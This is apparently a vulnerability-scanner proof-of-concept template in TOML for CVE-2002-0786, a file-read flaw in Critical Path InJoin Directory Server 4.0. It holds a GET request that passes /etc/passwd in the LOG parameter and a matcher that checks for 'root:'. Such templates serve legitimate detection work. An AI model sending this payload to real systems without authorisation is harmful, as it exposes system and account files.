[info]
author = "ave"
description = "Critical Path InJoin Directory Server 4.0 的 iCon 管理 Web 服务器存在文件读取漏洞，已通过身份验证的管理员可通过向 LOG 参数传递目标文件路径读取服务器任意文件"
id = "POC-AVE-2002-0442"
name = "Critical Path InJoin Directory Server 4.0 文件读取漏洞 PoC"
severity = "medium"
tags = ["ave-2002-0442"]
vuln_id = [
    "CVE-2002-0786",
    "AVE-2002-0442",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/CONF&LOG=/etc/passwd&NOIH=no&FRAMES=y"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
